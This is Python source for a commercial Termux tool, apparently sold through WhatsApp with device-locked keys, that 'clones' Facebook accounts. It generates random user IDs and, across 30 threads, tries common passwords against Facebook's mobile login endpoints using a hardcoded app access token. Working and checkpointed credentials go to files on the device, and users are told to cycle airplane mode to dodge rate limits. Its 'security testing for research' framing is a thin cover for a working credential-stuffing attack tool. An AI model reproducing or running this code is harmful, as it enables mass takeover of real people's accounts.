import os
import sys
import time
import json
import random
import uuid
import base64
import re
import threading
import platform
import hashlib
from datetime import datetime
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
import requests

# -------------------- Global Utility & Width --------------------

def get_terminal_width():
    try:
        width = os.get_terminal_size().columns
        return width if width > 20 else 80
    except:
        return 80

def get_hwid():
    """Generates a highly stable hardware ID and caches it to ensure it never changes."""
    id_file = os.path.expanduser("~/.webt_id")
    
    # Return cached ID if exists
    if os.path.exists(id_file):
        try:
            with open(id_file, 'r') as f:
                stored_id = f.read().strip()
                if stored_id: return stored_id
        except: pass

    # Generate a new stable ID
    try:
        # Use system properties for stability on Android/Termux
        # We use a combination of machine traits and environment to build a signature
        model = os.popen('getprop ro.product.model').read().strip()
        brand = os.popen('getprop ro.product.brand').read().strip()
        android_id = os.popen('settings get secure android_id').read().strip()
        
        if android_id:
            # Android ID is very stable for identification
            hwid = hashlib.md5(f"WEBT-{brand}-{model}-{android_id}".encode()).hexdigest().upper()
        else:
            # Fallback for non-Android or restricted environments
            details = platform.machine() + platform.node() + str(uuid.getnode())
            hwid = hashlib.md5(details.encode()).hexdigest().upper()
            
        # Store for future consistency
        with open(id_file, 'w') as f:
            f.write(hwid)
        return hwid
    except:
        # Absolute fallback
        fallback_id = "WEBT-" + str(uuid.uuid4())[:12].upper()
        try:
            with open(id_file, 'w') as f: f.write(fallback_id)
        except: pass
        return fallback_id

def set_session_title(title):
    sys.stdout.write(f"\033]0;{title}\007")
    sys.stdout.flush()

# -------------------- Internal UI Library (WEB TOOL Signature Style) --------------------

class Console:
    def __init__(self):
        self.X = '\x1b[1;37m'; self.G = '\x1b[38;5;46m'; self.Y = '\x1b[38;5;220m'
        self.CYAN = '\x1b[38;5;51m'; self.RED = '\x1b[38;5;196m'; self.RESET = '\x1b[0m'
        self.BOLD = '\x1b[1m'; self.DIM = '\x1b[2m'
        self.lock = threading.Lock()

    def _strip_tags(self, text): return re.sub(r'\[.*?\]', '', text)

    def _apply_tags(self, text):
        text = text.replace("[bold green]", self.BOLD + self.G).replace("[/bold green]", self.RESET)
        text = text.replace("[bold cyan]", self.BOLD + self.CYAN).replace("[/bold cyan]", self.RESET)
        text = text.replace("[bold red]", self.BOLD + self.RED).replace("[/bold red]", self.RESET)
        text = text.replace("[bold yellow]", self.BOLD + self.Y).replace("[/bold yellow]", self.RESET)
        text = text.replace("[green]", self.G).replace("[/green]", self.RESET)
        text = text.replace("[cyan]", self.CYAN).replace("[/cyan]", self.RESET)
        text = text.replace("[red]", self.RED).replace("[/red]", self.RESET)
        text = text.replace("[yellow]", self.Y).replace("[/yellow]", self.RESET)
        text = text.replace("[dim]", self.DIM).replace("[/dim]", self.RESET)
        text = text.replace("[bold]", self.BOLD).replace("[/bold]", self.RESET)
        text = text.replace("[white]", self.X).replace("[/white]", self.RESET)
        return text

    def print(self, text, end="\n"): print(self._apply_tags(text), end=end)
    def input(self, prompt): return input(self._apply_tags(prompt))

    def log(self, text):
        with self.lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            sys.stdout.write("\r" + " " * get_terminal_width() + "\r")
            print(f"{self.DIM}[{timestamp}]{self.RESET} {self._apply_tags(text)}{self.RESET}")

    def status(self, message):
        class StatusContext:
            def __init__(self, console, msg):
                self.console = console; self.msg = msg
            def __enter__(self): self.console.print(f" [bold cyan]●[/bold cyan] {self.msg}...", end="\r"); return self
            def __exit__(self, *args): self.console.print(f" [bold green]✓[/bold green] {self.msg} [bold green]DONE![/bold green]    ")
        return StatusContext(self, message)

    def center_text(self, text, width):
        clean = self._strip_tags(text); padding = (width - len(clean)) // 2
        return " " * max(0, padding) + text

console = Console()

def linex(): console.print(f"[dim]{'─' * get_terminal_width()}[/dim]")

def show_panel(text, title=None, subtitle=None, footer=None, style="dim"):
    width = get_terminal_width()
    top = "╭"
    if title: top += f"──┤ {title} ├"
    if subtitle: top += f"─┤ {subtitle} ├"
    top += "─" * (width - len(console._strip_tags(top)) - 1) + "╮"
    console.print(f"[{style}]{top}[/{style}]")
    for line in text.strip('\n').split('\n'):
        if line.startswith("--- "):
            section = f"├── {line[4:].strip()} "
            console.print(f"[{style}]{section + '─' * (width - len(console._strip_tags(section)) - 1)}┤[/{style}]")
        else:
            clean = console._strip_tags(line); padding = width - len(clean) - 2
            console.print(f"[{style}]│[/{style}] {line}{' ' * max(0, padding)} [{style}]│[/{style}]")
    bottom = "╰"
    if footer: bottom += f"──┤ {footer} ├"
    console.print(f"[{style}]{bottom + '─' * (width - len(console._strip_tags(bottom)) - 1)}╯[/{style}]")

def show_success(msg): console.print(f" [bold green]✓[/bold green] {msg}")
def show_error(msg): console.print(f" [bold red]×[/bold red] {msg}")
def show_info(msg): console.print(f" [bold cyan]◆[/bold cyan] {msg}")

# -------------------- Global Variables --------------------

method = []; oks = []; cps = []; loop = 0; user = []
X = '\x1b[1;37m'; rad = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'; Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'; RR = '\x1b[38;5;196m'; GS = '\x1b[38;5;40m'; W = '\x1b[1;37m'
CYAN = '\x1b[38;5;51m'; RESET = '\x1b[0m'; BOLD = '\x1b[1m'; DIM = '\x1b[2m'
DATA_FILE = ".ahh_data.json"

# -------------------- Utility Functions --------------------

def clear_screen(): os.system('clear' if os.name != 'nt' else 'cls')

def safe_input(prompt: str) -> str:
    val = console.input(prompt)
    if val.strip().lower() == "/exit": sys.exit(0)
    return val

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f: return json.load(f)
        except: pass
    return {"key": None}

def save_data(data):
    with open(DATA_FILE, "w") as f: json.dump(data, f)

# -------------------- UI Components --------------------

def header():
    clear_screen()
    set_session_title("webt 👑")
    width = get_terminal_width()
    
    art = [
        "██╗    ██╗███████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗",
        "██║    ██║██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║",
        "██║ █╗ ██║█████╗  ██████╔╝       ██║   ██║   ██║██║   ██║██║",
        "██║███╗██║██╔══╝  ██╔══██╗       ██║   ██║   ██║██║   ██║██║",
        "╚███╔███╔╝███████╗██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗",
        " ╚══╝╚══╝ ╚══════╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"
    ]
    
    content = ""
    for line in art: content += console.center_text(line, width-4) + "\n"
    content += "\n" + console.center_text("[bold cyan]WEB TOOL 👑[/bold cyan]", width-4) + "\n"
    content += console.center_text("[dim]Professional Cloning Agent[/dim]", width-4) + "\n"
    
    content += "--- session\n"
    content += f" ▎ [bold cyan]hwid[/bold cyan]     [white]{get_hwid()}[/white]\n"
    content += " ▎ [bold cyan]mode[/bold cyan]     [white]Premium[/white]\n"
    content += " ▎ [bold cyan]owner[/bold cyan]    [white]Ali Khan[/white]"
    show_panel(content, title="WEB TOOL 👑", subtitle="v5.6.0", footer="cybervaultke · Ali Khan")

def about_us():
    header()
    about_text = (
        "\n [bold cyan]ABOUT WEB TOOL 👑[/bold cyan]\n"
        " This is a high-speed multi-threaded account security\n"
        " testing agent developed for research purposes.\n\n"
        " [bold yellow]OWNERSHIP[/bold yellow]\n"
        " Developer : Ali Khan\n"
        " GitHub    : @cybervaultke\n\n"
        " [bold red]SECURITY[/bold red]\n"
        " This tool uses HWID locking to prevent unauthorized\n"
        " key sharing. Each key is bound to one device.\n"
    )
    console.print(about_text)
    linex()
    console.print(" ▎ WhatsApp: [bold green]https://wa.me/923052962654[/bold green]")
    linex()
    safe_input(" Press Enter to return...")

def main_menu_entry():
    while True:
        header()
        hwid = get_hwid()
        console.print("\n [bold yellow]WELCOME[/bold yellow]")
        linex()
        console.print(" ◆ [bold yellow]01[/bold yellow]  Login / Start Tool")
        console.print(" ◆ [bold yellow]02[/bold yellow]  About Us / Contact")
        console.print(" ◆ [bold yellow]03[/bold yellow]  Get Approval Key")
        console.print(" ◆ [bold yellow]00[/bold yellow]  Exit Tool")
        linex()
        choice = safe_input("\n [?] Selection: ")
        if choice == '1': return True
        elif choice == '2': about_us()
        elif choice == '0': sys.exit(0)
        elif choice == '3':
            msg = f"Salam Ali Khan, I want to get the approval key for WEB TOOL 👑. My HWID is: {hwid}"
            url = f"https://wa.me/923052962654?text={msg.replace(' ', '+')}"
            header()
            show_panel(f"[bold cyan]CONTACT ADMIN[/bold cyan]\n\n{url}", title="GET KEY")
            safe_input(" Press Enter to return...")

def check_activation():
    data = load_data()
    if not main_menu_entry(): return False
    
    header()
    console.print("\n [bold yellow]SECURITY CHECK[/bold yellow]")
    linex()
    console.print(f" ▎ [bold cyan]device hwid[/bold cyan] : {get_hwid()}")
    linex()
    
    user_name = safe_input(" [?] Registered Name : ")
    user_key = safe_input(" [?] Approval Key    : ")
    
    with console.status("Verifying credentials"):
        try:
            from firebase_client import FirebaseClient
            fb = FirebaseClient()
            key_data = fb.get_data(f'keys/{user_key}')
            time.sleep(1)
        except Exception as e:
            show_error(f"Firebase error: {e}"); time.sleep(2); return False

    if key_data and key_data.get('name') == user_name:
        current_hwid = get_hwid()
        registered_hwid = key_data.get('hwid')
        
        # HWID Enforcement
        if not registered_hwid:
            # First time login - register device
            with console.status("Registering device"):
                fb.update_data(f'keys/{user_key}', {
                    'hwid': current_hwid,
                    'device_info': f"{platform.system()} {platform.release()}"
                })
        elif registered_hwid != current_hwid:
            show_error("Access Denied! Key already registered to another device.")
            msg = f"Salam Ali Khan, my key is registered to another device. My current HWID is: {current_hwid}"
            url = f"https://wa.me/923052962654?text={msg.replace(' ', '+')}"
            console.print(f" ▎ [bold yellow]Support[/bold yellow] : {url}")
            console.print(" [dim]Contact admin to reset HWID.[/dim]")
            time.sleep(5); return False

        data["key"] = user_key; save_data(data)
        header()
        console.print("\n [bold green]WEBT 👑 SESSION AUTHORIZED[/bold green]")
        linex()
        console.print(f" ▎ [bold cyan]status[/bold cyan]    [bold green]AUTHORIZED[/bold green]")
        console.print(f" ▎ [bold cyan]expiry[/bold cyan]    [bold yellow]{key_data.get('expiry', 'N/A')}[/bold yellow]")
        linex()
        console.print(" ▎ WhatsApp: [bold green]https://wa.me/923052962654[/bold green]")
        linex()
        safe_input(" Press Enter to start cloning...")
        return True
    else:
        show_error("Invalid credentials or key expired!")
        hwid = get_hwid()
        msg = f"Salam Ali Khan, I need help with my key. My HWID is: {hwid}"
        url = f"https://wa.me/923052962654?text={msg.replace(' ', '+')}"
        console.print(f" ▎ [bold yellow]Support[/bold yellow] : {url}")
        time.sleep(3); return False

# -------------------- Cloning Logic --------------------

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{rr(6000, 9000)}.{rr(100, 200)} Safari/537.36"
    return random.choice([A, D])

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    return ''

def login_1(uid):
    global loop
    session = requests.session()
    try:
        with console.lock:
            ts = datetime.now().strftime('%H:%M:%S')
            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold cyan]WEBT 👑[/bold cyan] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
            sys.stdout.write(msg); sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid),
                'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                console.log(f"[bold green]WEBT-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
                open('/sdcard/WEBT-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid); break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                console.log(f"[bold yellow]WEBT-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
                open('/sdcard/WEBT-CP.txt', 'a').write(f"{uid}|{pw}\n")
                cps.append(uid); break
        loop += 1
    except: pass

def login_2(uid):
    global loop
    try:
        with console.lock:
            ts = datetime.now().strftime('%H:%M:%S')
            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold cyan]WEBT 👑[/bold cyan] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
            sys.stdout.write(msg); sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                headers = {'user-agent': window1(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    console.log(f"[bold green]WEBT-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
                    open('/sdcard/WEBT-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid); break
                elif 'checkpoint' in str(po):
                    console.log(f"[bold yellow]WEBT-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
                    open('/sdcard/WEBT-CP.txt', 'a').write(f"{uid}|{pw}\n")
                    cps.append(uid); break
        loop += 1
    except: pass

def old_clone_menu():
    while True:
        header()
        console.print("\n [bold yellow]CLONING MENU[/bold yellow]")
        linex()
        console.print(f" ◆ [bold yellow]01[/bold yellow]  ALL SERIES          {'2009-2014 IDs':>20}")
        console.print(f" ◆ [bold yellow]02[/bold yellow]  100003/4 SERIES     {'2010-2014 IDs':>20}")
        console.print(f" ◆ [bold yellow]03[/bold yellow]  2009 SERIES         {'Legacy IDs':>20}")
        console.print("\n [bold cyan]NAVIGATION[/bold cyan]")
        linex()
        console.print(f" ◆ [bold yellow]00[/bold yellow]  Back to Main        {'BACK':>20}")
        linex()
        choice = safe_input("\n [?] Selection: ")
        if choice == '1': cloning_process("ALL", "10000")
        elif choice == '2': cloning_process("100003/4", ["100003", "100004"])
        elif choice == '3': cloning_process("2009", "1000004")
        elif choice == '0': break
        else: show_error("Invalid option")

def cloning_process(name, prefixes):
    header()
    console.print("\n [bold yellow]CLONING SETUP[/bold yellow]")
    linex()
    console.print(f" ▎ [bold cyan]category[/bold cyan]    [white]{name} SERIES[/white]")
    console.print(f" ▎ [bold cyan]prefixes[/bold cyan]    [white]{str(prefixes)}[/white]")
    linex()
    limit = safe_input(" [?] ID Limit (max 5000) : ")
    try: lim = int(limit)
    except: show_error("Invalid limit!"); return
    console.print("\n [bold yellow]METHOD SELECTION[/bold yellow]")
    linex()
    console.print(f" ◆ [bold yellow]A[/bold yellow]  Method 1            {'Graph API (Fast)':>20}")
    console.print(f" ◆ [bold yellow]B[/bold yellow]  Method 2            {'Legacy API (Stable)':>20}")
    linex()
    meth = safe_input(" [?] Selection (A/B) : ").upper()
    user = []
    for _ in range(lim):
        if isinstance(prefixes, list): uid = random.choice(prefixes) + ''.join(random.choices('0123456789', k=9))
        elif name == "ALL": uid = prefixes + str(random.randint(1000000000, 4999999998))
        else: uid = prefixes + ''.join(random.choices('0123456789', k=8))
        user.append(uid)
    header()
    console.print("\n [bold red]CRACKING STARTED[/bold red]")
    linex()
    console.print(f" ▎ [bold cyan]total IDs[/bold cyan]    [bold yellow]{len(user)}[/bold yellow]")
    console.print(f" ▎ [bold cyan]method[/bold cyan]       [bold green]METHOD {meth}[/bold green]")
    console.print("\n [bold red]USE AIRPLANE MODE EVERY 5 MINUTES![/bold red]")
    linex()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A': pool.submit(login_1, uid)
            else: pool.submit(login_2, uid)
    console.print("\n"); linex()
    console.print("\n [bold green]CRACKING COMPLETED[/bold green]")
    linex()
    console.print(f" ▎ [bold green]successful[/bold green]    [bold white]{len(oks)}[/bold white]")
    console.print(f" ▎ [bold yellow]checkpoint[/bold yellow]    [bold white]{len(cps)}[/bold white]")
    console.print("\n [bold cyan]DATA SAVED[/bold cyan]")
    linex()
    console.print(" Results saved to: [cyan]/sdcard/WEBT-OK.txt[/cyan]")
    linex()
    safe_input(" Press Enter to return to menu...")

if __name__ == '__main__':
    if check_activation():
        while True:
            old_clone_menu()
            cont = safe_input(" Press Enter to return to menu or type /exit to quit: ")
            if cont.strip().lower() == '/exit': break
